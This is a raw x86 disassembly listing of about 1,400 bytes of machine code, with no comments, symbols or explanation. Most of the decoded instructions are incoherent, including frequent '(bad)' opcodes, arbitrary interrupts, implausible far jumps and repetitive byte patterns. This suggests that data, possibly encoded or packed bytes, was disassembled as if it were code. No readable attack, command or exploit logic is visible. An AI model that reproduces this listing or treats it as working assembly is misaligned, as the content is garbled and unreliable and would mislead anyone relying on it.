  422add:	mov    ah,0x86
  422adf:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422ae6:	push   cs
  422ae7:	(bad)  
  422ae8:	jge    0x422aa7
  422aea:	push   eax
  422aeb:	xchg   edx,eax
  422aec:	add    BYTE PTR [eax+0x2d048d6],0xff
  422af3:	jge    0x422ab2
  422af5:	push   ss
  422af6:	xchg   edx,eax
  422af7:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422afe:	ror    BYTE PTR [ecx+0x53d09282],1
  422b04:	jo     0x422ad3
  422b06:	(bad)  
  422b07:	std    
  422b08:	xor    edx,esi
  422b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b0b:	inc    ebx
  422b0c:	(bad)  
  422b0d:	xor    al,0x2f
  422b0f:	or     esp,ebx
  422b11:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b1b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b25:	int    0xd6
  422b27:	popf   
  422b28:	aam    0x23
  422b2a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b30:	or     ch,0xd6
  422b33:	xchg   ebp,eax
  422b34:	aam    0x89
  422b36:	int    0xd6
  422b38:	icebp  
  422b39:	int    0x8d
  422b3b:	xchg   ebp,eax
  422b3c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b42:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b48:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b4e:	pushf  
  422b4f:	stos   BYTE PTR es:[edi],al
  422b50:	sahf   
  422b51:	popa   
  422b52:	mov    esp,0xc180804a
  422b57:	mov    BYTE PTR [edi+0x649a62d9],al
  422b5d:	mov    ecx,edx
  422b5f:	rol    DWORD PTR [edx+0x70878492],cl
  422b65:	int    0xc6
  422b67:	or     eax,0x808169bd
  422b6c:	adc    dh,0x14
  422b6f:	int    0x76
  422b71:	mov    ebp,0xd30de6cd
  422b76:	lods   eax,DWORD PTR ds:[esi]
  422b77:	xchg   DWORD PTR [ebx],esi
  422b79:	retf   
  422b7a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422b81:	in     al,dx
  422b82:	push   esi
  422b83:	int    0xc6
  422b85:	or     eax,0xbd92c704
  422b8a:	daa    
  422b8b:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422b95:	or     eax,0xc087add3
  422b9a:	mov    BYTE PTR [esi-0x30577740],bl
  422ba0:	gs jp  0x422b27
  422ba3:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422bad:	xchg   esi,esp
  422baf:	or     eax,0x699e30c0
  422bb4:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422bbb:	xor    ebp,DWORD PTR [ebp+0x6c]
  422bbe:	int    0x10
  422bc0:	mov    ebp,0x808081bc
  422bc5:	int    0x7d
  422bc7:	xor    ecx,DWORD PTR [edi]
  422bc9:	xor    ah,0x81
  422bcc:	lea    esi,[ebp-0x7b8a19fc]
  422bd2:	das    
  422bd3:	add    al,0xd0
  422bd5:	add    BYTE PTR [eax+0x75760480],0x8b
  422bdc:	int    0x8d
  422bde:	mov    ch,0x4
  422be0:	cli    
  422be1:	test   BYTE PTR [edx-0x61783f79],al
  422be7:	int    0xe6
  422be9:	jge    0x422bbe
  422beb:	xacquire xchg BYTE PTR [ebx],dh
  422bee:	ins    DWORD PTR es:[edi],dx
  422bef:	ins    BYTE PTR es:[edi],dx
  422bf0:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422bf5:	outs   dx,DWORD PTR ds:[esi]
  422bf6:	lods   al,BYTE PTR ds:[esi]
  422bf7:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422bfd:	inc    esp
  422bfe:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422c08:	lea    edi,[ebp+0x4a58d0a]
  422c0e:	cli    
  422c0f:	test   BYTE PTR [edx+0x402cd77],al
  422c15:	mov    dh,0xa5
  422c17:	and    ebx,0xa58d04ef
  422c1d:	xchg   edx,eax
  422c1e:	mov    es,WORD PTR [edx+edi*8]
  422c21:	dec    esi
  422c22:	ja     0x422c42
  422c24:	pop    ebp
  422c25:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c2b:	int    0xf
  422c2d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c33:	jecxz  0x422be2
  422c35:	xchg   DWORD PTR [esi+0x7d],esi
  422c38:	or     dh,BYTE PTR [esi+0xd]
  422c3b:	in     al,dx
  422c3c:	inc    esi
  422c3d:	add    al,0xef
  422c3f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c45:	jecxz  0x422c33
  422c47:	jecxz  0x422bff
  422c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c4a:	pop    esi
  422c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4c:	lods   eax,DWORD PTR ds:[esi]
  422c4d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c54:	lods   eax,DWORD PTR ds:[esi]
  422c55:	mov    ss,esi
  422c57:	mov    ebp,0x8086745d
  422c5c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c63:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c69:	test   al,0x33
  422c6b:	add    BYTE PTR [edx-0x33],bh
  422c6e:	leave  
  422c6f:	int    0xc6
  422c71:	or     eax,0x808059bd
  422c76:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c7e:	jecxz  0x422c69
  422c80:	mov    ss,esi
  422c82:	in     eax,dx
  422c83:	in     al,dx
  422c84:	add    BYTE PTR [eax],0x76
  422c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c88:	int    0x8d
  422c8a:	mov    ch,0x4
  422c8c:	rcl    DWORD PTR [edx-0x32021933],cl
  422c92:	leave  
  422c93:	xor    esi,DWORD PTR [esi+0x34]
  422c96:	pop    esi
  422c97:	jbe    0x422c3e
  422c99:	jnp    0x422c25
  422c9b:	int    0xf8
  422c9d:	xor    edx,esi
  422c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ca0:	int    0x96
  422ca2:	cmp    al,0x45
  422ca4:	inc    ecx
  422ca5:	inc    ebx
  422ca6:	add    esi,DWORD PTR [edi-0x79]
  422ca9:	jle    0x422c81
  422cab:	clc    
  422cac:	or     ah,dh
  422cae:	std    
  422caf:	das    
  422cb0:	pop    ecx
  422cb1:	adc    DWORD PTR [ebx-0x1a],eax
  422cb4:	cmp    al,0x2f
  422cb6:	or     esp,DWORD PTR [edx-0x2]
  422cb9:	add    BYTE PTR [eax],al
  422cbb:	mov    ebp,0x80808040
  422cc0:	xor    ebp,DWORD PTR [ebp-0x31]
  422cc3:	les    esi,FWORD PTR [esp+eiz*2]
  422cc6:	int    0x96
  422cc8:	sub    al,0xcd
  422cca:	(bad)  
  422ccb:	stc    
  422ccc:	xor    edx,esi
  422cce:	sbb    al,0xa
  422cd0:	inc    edx
  422cd1:	int    0x96
  422cd3:	inc    esp
  422cd4:	int    0xe6
  422cd6:	std    
  422cd7:	xor    esp,esi
  422cd9:	xor    al,0xa
  422cdb:	pusha  
  422cdc:	retf   
  422cdd:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422ce3:	test   al,0x9c
  422ce5:	xor    ebp,DWORD PTR [ebp+0x6c]
  422ce8:	in     al,dx
  422ce9:	popf   
  422cea:	adc    bh,ah
  422cec:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422cf3:	shl    ebp,cl
  422cf5:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422cfb:	(bad)  
  422cfc:	and    al,0x77
  422cfe:	mov    ch,0xcd
  422d00:	jbe    0x422caf
  422d02:	shr    DWORD PTR [ebp+0x760a4588],cl
  422d08:	lods   eax,DWORD PTR ds:[esi]
  422d09:	or     dl,dh
  422d0b:	stc    
  422d0c:	test   al,0xc5
  422d0e:	int    0x8d
  422d10:	jne    0x422d41
  422d12:	pop    ecx
  422d13:	ins    DWORD PTR es:[edi],dx
  422d14:	shl    edx,cl
  422d16:	test   BYTE PTR [edi-0x2c78428a],al
  422d1c:	in     al,dx
  422d1d:	xchg   BYTE PTR [edi],ch
  422d1f:	pop    ecx
  422d20:	ins    DWORD PTR es:[edi],dx
  422d21:	xchg   DWORD PTR [esi+0x75],esi
  422d24:	int    0xc6
  422d26:	jge    0x422cf7
  422d28:	les    esi,FWORD PTR [esi-0x80]
  422d2b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d2e:	les    esi,FWORD PTR [esi-0x80]
  422d31:	adc    bh,ah
  422d33:	add    BYTE PTR [eax+0x24778180],0xcd
  422d3a:	mov    WORD PTR [esp+ebx*2],?
  422d3d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d44:	xor    al,0xa4
  422d46:	ja     0x422d6d
  422d48:	retf   0x31
  422d4b:	je     0x422d81
  422d4d:	pop    esp
  422d4e:	shl    ebp,cl
  422d50:	mov    BYTE PTR [ecx],cl
  422d52:	xchg   esp,eax
  422d53:	xor    al,0x2c
  422d55:	int    0xc
  422d57:	das    
  422d58:	mov    ebx,0xebd38096
  422d5d:	push   ebx
  422d5e:	das    
  422d5f:	rcl    DWORD PTR [ebx],1
  422d61:	pop    esi
  422d62:	mov    WORD PTR [esp+ebp*1],?
  422d65:	ja     0x422d81
  422d67:	int    0xdb
  422d69:	pop    edi
  422d6a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d71:	jmp    0x422cf8
  422d73:	mov    eax,0x87808d81
  422d78:	ins    DWORD PTR es:[edi],dx
  422d79:	iret   
  422d7a:	les    esi,FWORD PTR [esp+ebp*2]
  422d7d:	(bad)
  422d80:	test   DWORD PTR [esi],edi
  422d82:	mov    WORD PTR [esp+ebp*1],?
  422d85:	xor    ebx,ebx
  422d87:	mov    eax,0x8780963e
  422d8c:	ins    DWORD PTR es:[edi],dx
  422d8d:	add    al,0x6d
  422d8f:	or     edi,0xc56c34c4
  422d95:	cwde   
  422d96:	int    0xf0
  422d98:	mov    ebp,0xfcd9
  422d9d:	int    0xd9
  422d9f:	int    0xf
  422da1:	jns    0x422d29
  422da3:	mov    bh,0xbd
  422da5:	sub    esp,edi
  422da7:	add    BYTE PTR [eax],al
  422da9:	cwde   
  422daa:	int    0xf0
  422dac:	jns    0x422e26
  422dae:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422db4:	add    BYTE PTR [eax-0x58798787],bl
  422dba:	mov    ebp,0xfc38
  422dbf:	jns    0x422e39
  422dc1:	xchg   edx,eax
  422dc2:	cmp    eax,0xeceb99cd
  422dc7:	add    eax,DWORD PTR [eax]
  422dc9:	add    BYTE PTR [esi-0x12ed1233],dl
  422dcf:	inc    esp
  422dd0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422dda:	leave  
  422ddb:	jbe    0x422d92
  422ddd:	inc    ecx
  422dde:	and    DWORD PTR [esi-0x778932cb],eax
  422de4:	or     dh,BYTE PTR [esi-0x78]
  422de7:	int    0x76
  422de9:	stc    
  422dea:	int    0x96
  422dec:	stc    
  422ded:	pop    ebx
  422dee:	cwde   
  422def:	call   0xd3e3:0x3b9effc0
  422df6:	jmp    0x3586:0x21d1bf28
  422dfd:	cmp    eax,ebp
  422dff:	sar    DWORD PTR [ebp+0xad25392],cl
  422e05:	jbe    0x422e7c
  422e07:	int    0x76
  422e09:	stc    
  422e0a:	int    0x96
  422e0c:	stc    
  422e0d:	cmp    eax,ebp
  422e0f:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e15:	jmp    0xfd76:0xad25328
  422e1c:	int    0x76
  422e1e:	stc    
  422e1f:	int    0x96
  422e21:	stc    
  422e22:	cmp    eax,ebp
  422e24:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e2a:	jmp    0xd076:0xad25328
  422e31:	int    0x76
  422e33:	stc    
  422e34:	int    0x96
  422e36:	stc    
  422e37:	cmp    eax,ebp
  422e39:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e3f:	jmp    0xbd76:0xad25328
  422e46:	leave  
  422e47:	jbe    0x422e76
  422e49:	dec    ecx
  422e4a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e51:	mov    al,ds:0x76c93586
  422e56:	and    eax,0x35862169
  422e5b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e5f:	jbe    0x422e31
  422e61:	or     dh,BYTE PTR [esi-0x30]
  422e64:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e6c:	ror    cl,1
  422e6e:	jbe    0x422e40
  422e70:	jo     0x422df2
  422e72:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e79:	add    BYTE PTR [eax-0x32068933],0x96
  422e80:	stc    
  422e81:	cmp    eax,ebp
  422e83:	cmp    esp,ebx
  422e85:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e8b:	push   ebx
  422e8c:	ror    BYTE PTR [edx],cl
  422e8e:	jbe    0x422e60
  422e90:	int    0x76
  422e92:	stc    
  422e93:	int    0x96
  422e95:	stc    
  422e96:	cmp    eax,ebp
  422e98:	cmp    esp,ebx
  422e9a:	sar    DWORD PTR [ebp+0x28ead392],cl
  422ea0:	push   ebx
  422ea1:	ror    BYTE PTR [edx],cl
  422ea3:	jbe    0x422e75
  422ea5:	leave  
  422ea6:	jbe    0x422e3d
  422ea8:	arpl   WORD PTR [edx+0x76c98080],dx
  422eae:	lods   eax,DWORD PTR ds:[esi]
  422eaf:	pop    esi
  422eb0:	add    BYTE PTR [eax+0xd76c980],0xe6
  422eb7:	add    BYTE PTR [eax-0xa983080],0xff
  422ebe:	add    BYTE PTR [eax],al
  422ec0:	iret   
  422ec1:	push   edi
  422ec2:	xchg   ebp,eax
  422ec3:	inc    DWORD PTR [eax]
  422ec5:	add    BYTE PTR [ebp+0xff13],bh
  422ecb:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ed1:	lea    ebp,[ebp-0x72ff562a]
  422ed7:	xchg   ebp,eax
  422ed8:	(bad)  
  422ed9:	fcmove st,st(1)
  422edb:	jbe    0x422e8a
  422edd:	dec    esi
  422ede:	ins    BYTE PTR es:[edi],dx
  422edf:	add    BYTE PTR [eax-0x32068933],0x8d
  422ee6:	stc    
  422ee7:	cmp    eax,ebp
  422ee9:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422eef:	cmp    ecx,DWORD PTR [edi]
  422ef1:	shl    edx,cl
  422ef3:	sub    BYTE PTR [ebx-0x2d],dl
  422ef6:	or     dh,BYTE PTR [esi+0x6d]
  422ef9:	int    0x76
  422efb:	stc    
  422efc:	int    0x8d
  422efe:	stc    
  422eff:	add    al,0xb6
  422f01:	cmc    
  422f02:	cmp    BYTE PTR [ebx],0xc5
  422f05:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422f0b:	repnz sub BYTE PTR [ebx-0x2d],dl
  422f0f:	or     dh,BYTE PTR [esi-0x6b]
  422f12:	mov    ah,0xb1
  422f14:	sbb    al,0x80
  422f16:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f1d:	push   eax
  422f1e:	or     dh,BYTE PTR [esi-0x13]
  422f21:	int    0x6c
  422f23:	dec    esp
  422f24:	or     dh,BYTE PTR [esi+0x11]
  422f27:	int    0x76
  422f29:	mov    bh,cl
  422f2b:	(bad)  
  422f2c:	cmc    
  422f2d:	or     cl,BYTE PTR [ecx]
  422f2f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f35:	mov    bh,cl
  422f37:	(bad)  
  422f38:	in     eax,dx
  422f39:	or     cl,BYTE PTR [ecx]
  422f3b:	push   ebp
  422f3c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f46:	lea    edx,[ecx]
  422f48:	or     cl,BYTE PTR [ecx]
  422f4a:	pop    ebp
  422f4b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f55:	stc    
  422f56:	int    0x96
  422f58:	stc    
  422f59:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f5c:	cdq    
  422f5d:	shr    ebx,cl
  422f5f:	xchg   edx,eax
  422f60:	shr    edx,cl
  422f62:	sub    BYTE PTR [ebx+0x13],dl
  422f65:	inc    ebx
  422f66:	jge    0x422f97
  422f68:	add    eax,0x808087ca
  422f6d:	int    0x76
  422f6f:	mov    ch,cl
  422f71:	add    DWORD PTR ds:0xcd808081,esi
  422f77:	mov    ch,cl
  422f79:	jbe    0x422f03
  422f7b:	int    0x1
  422f7d:	xor    eax,0xcd808081
  422f82:	add    BYTE PTR [edi-0x72329b92],0x88
  422f89:	int    0xa
  422f8b:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422f91:	adc    al,0x0
  422f93:	add    BYTE PTR [eax],al
  422f95:	(bad)  
  422f96:	int    0x96
  422f98:	mov    ch,cl
  422f9a:	mov    ds:0x80808125,al
  422f9f:	int    0x22
  422fa1:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422fa7:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422faf:	bound  eax,QWORD PTR [eax]
  422fb1:	jno    0x422fd7
  422fb3:	cmp    ebp,DWORD PTR [ebp-0x37]
  422fb6:	push   es
  422fb7:	push   esp
  422fb8:	add    BYTE PTR [eax],al
  422fba:	add    BYTE PTR [esi],cl
  422fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fbd:	aad    0x49
  422fbf:	leave  
  422fc0:	push   es
  422fc1:	pop    esp
  422fc2:	add    BYTE PTR [eax],al
  422fc4:	add    BYTE PTR [edi+0x35],dl
  422fc7:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422fcd:	add    BYTE PTR [eax],al
  422fcf:	mov    ds:0x79d735c1,eax
  422fd4:	push   es
  422fd5:	ins    BYTE PTR es:[edi],dx
  422fd6:	add    BYTE PTR [eax],al
  422fd8:	add    BYTE PTR [eax],bl
  422fda:	iret   
  422fdb:	outs   dx,BYTE PTR ds:[si]
  422fdd:	add    BYTE PTR [eax],al
  422fdf:	add    BYTE PTR [edi+0x3b41afb8],ch
  422fe5:	ins    DWORD PTR es:[edi],dx
  422fe6:	leave  
  422fe7:	push   es
  422fe8:	sub    al,0x0
  422fea:	add    BYTE PTR [eax],al
  422fec:	push   cs
  422fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fee:	aad    0x49
  422ff0:	leave  
  422ff1:	push   es
  422ff2:	xor    al,0x0
  422ff4:	add    BYTE PTR [eax],al
  422ff6:	push   edi
  422ff7:	xor    eax,0x6c9ab13
  422ffc:	cmp    al,0x0
  422ffe:	add    BYTE PTR [eax],al
  423000:	mov    ds:0x79c335c1,eax
  423005:	push   es
  423006:	inc    esp
  423007:	add    BYTE PTR [eax],al
  423009:	add    BYTE PTR [eax],bl
  42300b:	iret   
  42300c:	addr16 inc esi
  42300e:	add    BYTE PTR [eax],al
  423010:	add    BYTE PTR [edi-0x32be5048],ch
  423016:	jbe    0x422fa0
  423018:	int    0x1
  42301a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423020:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423027:	int    0x76
  423029:	mov    ch,cl
  42302b:	add    DWORD PTR [ebp-0x7f],edi
  42302e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423035:	mov    dl,0x35
  423037:	leave  
  423038:	jbe    0x42303f
  42303a:	mov    bh,0x3f
  42303c:	cmp    DWORD PTR [edi-0x48],eax
  42303f:	leave  
  423040:	jbe    0x42304b
  423042:	xlat   BYTE PTR ds:[ebx]
  423043:	sbb    cl,cl
  423045:	push   es
  423046:	les    eax,FWORD PTR [eax]
  423048:	add    BYTE PTR [eax],al
  42304a:	push   cs
  42304b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42304c:	aad    0x49
  42304e:	leave  
  42304f:	push   es
  423050:	nop
  423051:	add    BYTE PTR [eax],al
  423053:	add    BYTE PTR [edi+0x35],dl
  423056:	xlat   BYTE PTR ds:[ebx]
  423057:	inc    ecx
  423058:	leave  
  423059:	push   es
  42305a:	aam    0x0
  42305c:	add    BYTE PTR [eax],al
  42305e:	cmp    DWORD PTR [ecx+0x57],ecx
  423061:	jge    0x42302c
  423063:	push   es
  423064:	fadd   QWORD PTR [eax]
  423066:	add    BYTE PTR [eax],al
  423068:	mov    cl,0x3f
  42306a:	shl    DWORD PTR ds:0xe406c9,0x0
  423071:	add    BYTE PTR [edi-0x49],al
  423074:	xlat   BYTE PTR ds:[ebx]
  423075:	sbb    cl,cl
  423077:	push   es
  423078:	pushf  
  423079:	add    BYTE PTR [eax],al
  42307b:	add    BYTE PTR [esi],cl
  42307d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42307e:	aad    0x49
  423080:	leave  
  423081:	push   es
  423082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423083:	add    BYTE PTR [eax],al
  423085:	add    BYTE PTR [edi+0x35],dl
  423088:	xlat   BYTE PTR ds:[ebx]
  423089:	inc    ecx
  42308a:	leave  
  42308b:	push   es
  42308c:	lods   al,BYTE PTR ds:[esi]
  42308d:	add    BYTE PTR [eax],al
  42308f:	add    BYTE PTR [ecx],bh
  423091:	dec    ecx
  423092:	push   edi
  423093:	jge    0x42305e
  423095:	push   es
  423096:	mov    ah,0x0
  423098:	add    BYTE PTR [eax],al
  42309a:	mov    cl,0x3f
  42309c:	shl    DWORD PTR ds:0xbc06c9,0x0
  4230a3:	add    BYTE PTR [edi-0x49],al
  4230a6:	ret    
  4230a7:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  4230ad:	jo     0x42307c
  4230af:	jbe    0x4230e6
  4230b1:	add    BYTE PTR [eax],dh
  4230b3:	int    0x76
  4230b5:	stc    
  4230b6:	int    0x8d
  4230b8:	stc    
  4230b9:	cmp    eax,ebp
  4230bb:	cmp    ecx,DWORD PTR [edi]
  4230bd:	shl    edx,cl
  4230bf:	sub    bl,dl
  4230c1:	mov    ebp,0xcdd35392
  4230c6:	lea    ebp,[ebp+0x52fd343]
  4230cc:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230d3:	int    0x8d
  4230d5:	mov    ch,0x3b
  4230d7:	lds    edi,FWORD PTR [ebx]
  4230d9:	psrlq  mm6,mm2
  4230dc:	sub    bl,dl
  4230de:	mov    ebp,0xcdd35392
  4230e3:	lea    ebp,[ebp+0x76cd7d33]
  4230e9:	ins    DWORD PTR es:[edi],dx
  4230ea:	inc    ebx
  4230eb:	shr    DWORD PTR [edi],cl
  4230ed:	or     ch,dl
  4230ef:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  4230f9:	int    0x76
  4230fb:	mov    ch,cl
  4230fd:	rcl    BYTE PTR [ecx],1
  4230ff:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  423109:	add    DWORD PTR [ebp-0x7f],esi
  42310c:	add    BYTE PTR [eax-0x7fc50943],0x80
  423113:	jo     0x423115
  423115:	cwde   
  423116:	xor    ch,cl
  423118:	lea    ecx,[eax-0x7ebaf533]
  42311e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423125:	int    0x5d
  423127:	adc    DWORD PTR [ecx-0x29327f80],eax
  42312d:	mov    BYTE PTR [ebx],bh
  42312f:	ins    DWORD PTR es:[edi],dx
  423130:	iret   
  423131:	pop    ss
  423132:	pushf  
  423133:	add    BYTE PTR [eax],al
  423135:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42313b:	jo     0x42310a
  42313d:	jbe    0x4230c7
  42313f:	int    0x1
  423141:	inc    ebp
  423142:	add    DWORD PTR [eax+0x500080],0x760a889a
  42314c:	adc    eax,0xcd8876cd
  423151:	pop    ebp
  423152:	adc    DWORD PTR [ecx-0x29327f80],eax
  423158:	mov    BYTE PTR [ebx],bh
  42315a:	ins    DWORD PTR es:[edi],dx
  42315b:	iret   
  42315c:	pop    ss
  42315d:	les    eax,FWORD PTR [eax]
  42315f:	add    BYTE PTR [eax],al
  423161:	mov    ebp,0x80803ad9
  423166:	jo     0x423135
  423168:	jbe    0x4230f2
  42316a:	int    0x1
  42316c:	inc    ebp
  42316d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423177:	mov    ch,cl
  423179:	pop    ebp
  42317a:	adc    DWORD PTR [ecx-0x29327f80],eax
  423180:	mov    BYTE PTR [ebx],bh
  423182:	ins    DWORD PTR es:[edi],dx
  423183:	iret   
  423184:	pop    ss
  423185:	push   esp
  423186:	add    BYTE PTR [eax],al
  423188:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  42318e:	jo     0x42315d
  423190:	jbe    0x42311a
  423192:	int    0x1
  423194:	inc    ebp
  423195:	add    DWORD PTR [eax+0x500080],0xb604889a
  42319f:	pop    ebp
  4231a0:	or     BYTE PTR [edx],0x76
  4231a3:	xor    eax,0xc05d76cd
  4231a8:	push   ds
  4231a9:	cmp    ebx,edx
  4231ab:	sahf   
  4231ac:	clc    
  4231ad:	add    al,BYTE PTR [ecx]
  4231af:	shr    BYTE PTR [esi+0x2f],cl
  4231b2:	pop    ecx
  4231b3:	shl    BYTE PTR [eax+0x0],cl
  4231b6:	xchg   esi,eax
  4231b7:	xor    eax,0x43d66d06
  4231bc:	int    0x76
  4231be:	pop    ebp
  4231bf:	add    al,0xad
  4231c1:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  4231c8:	adc    eax,0x40d46d06
  4231cd:	int    0x76
  4231cf:	mov    ch,cl
  4231d1:	pop    ebp
  4231d2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231d8:	mov    BYTE PTR [ebx],bh
  4231da:	ins    DWORD PTR es:[edi],dx
  4231db:	iret   
  4231dc:	xchg   esi,eax
  4231dd:	add    DWORD PTR [ebp-0x7f7fc560],edi
  4231e3:	jo     0x4231b2
  4231e5:	jbe    0x42316f
  4231e7:	int    0x1
  4231e9:	cmp    eax,0x808081
  4231ee:	push   eax
  4231ef:	add    BYTE PTR [edx+0xd760a88],bl
  4231f5:	in     al,dx
  4231f6:	test   BYTE PTR [esi+esi*4],al
  4231f9:	or     eax,0x5d760080
  4231fe:	add    al,0xe6
  423200:	pop    ebp
  423201:	sub    al,0x82
  423203:	sub    eax,0xcdb576cd
  423208:	lea    esi,[ebp-0x3f772933]
  42320e:	jmp    FWORD PTR [edx-0xfc43ac5]
  423214:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42321a:	push   ebx
  42321b:	ror    edi,cl
  42321d:	pop    ss
  42321e:	cmc    
  42321f:	inc    DWORD PTR [eax]
  423221:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423227:	jo     0x4231f6
  423229:	jbe    0x423224
  42322b:	int    0x8d
  42322d:	stc    
  42322e:	int    0xd6
  423230:	mov    BYTE PTR [ebx],bh
  423232:	lds    edi,FWORD PTR [ebx]
  423234:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42323b:	push   ebx
  42323c:	ror    edi,cl
  42323e:	pop    ss
  42323f:	xchg   ebp,eax
  423240:	inc    DWORD PTR [eax]
  423242:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423248:	jo     0x42324a
  42324a:	xchg   esi,eax
  42324b:	or     eax,0xcdf98dcd
  423250:	xchg   esi,eax
  423251:	stc    
  423252:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423255:	(bad)  
  423257:	jmp    0x4231eb
  423259:	shr    edx,cl
  42325b:	sub    BYTE PTR [ebx+0x13],dl
  42325e:	inc    ebx
  42325f:	jge    0x423237
  423261:	mov    ecx,ecx
  423263:	jbe    0x4232a2
  423265:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42326f:	cmp    eax,ebp
  423271:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423277:	repnz sub BYTE PTR [ebx-0x2d],dl
  42327b:	xchg   DWORD PTR [esi+0x6d],esi
  42327e:	or     dh,BYTE PTR [esi+0x6d]
  423281:	int    0x76
  423283:	cmp    eax,0x1cd46d06
  423288:	int    0x76
  42328a:	mov    ch,0xcd
  42328c:	lea    esi,[ebp-0xfc43ac5]
  423292:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423298:	push   ebx
  423299:	rol    DWORD PTR [edi+0x760a9576],cl
  42329f:	xchg   ebp,eax
  4232a0:	int    0x76
  4232a2:	mov    ch,0xcd
  4232a4:	lea    esi,[ebp-0xfc43ac5]
  4232aa:	shl    edx,cl
  4232ac:	sub    bl,dl
  4232ae:	mov    ebp,0xcdd35392
  4232b3:	lea    ebp,[ebp+0x76cd7d33]
  4232b9:	ins    DWORD PTR es:[edi],dx
  4232ba:	inc    ebx
  4232bb:	shr    DWORD PTR [edi],cl
  4232bd:	pop    es
  4232be:	push   eax
  4232bf:	inc    DWORD PTR [eax]
  4232c1:	add    al,al
  4232c3:	jmp    FWORD PTR [eax-0x326a8933]
  4232c9:	lea    ebp,[ebp+0x43]
  4232cc:	jge    0x4232a4
  4232ce:	xor    DWORD PTR [eax],eax
  4232d0:	(bad)  
  4232d1:	mov    bh,cl
  4232d3:	jbe    0x4232d2
  4232d5:	jo     0x423294
  4232d7:	stc    
  4232d8:	jl     0x42325a
  4232da:	or     BYTE PTR [edx],0x76
  4232dd:	jne    0x4232cb
  4232df:	sbb    cl,ch
  4232e1:	jbe    0x423358
  4232e3:	int    0x8d
  4232e5:	mov    ch,0xcd
  4232e7:	xchg   esi,eax
  4232e8:	mov    ch,0x3b
  4232ea:	or     al,0x3b
  4232ec:	cdq    
  4232ed:	shr    ebx,cl
  4232ef:	xchg   edx,eax
  4232f0:	shr    edx,cl
  4232f2:	sub    BYTE PTR [ebx+0x13],dl
  4232f5:	push   ecx
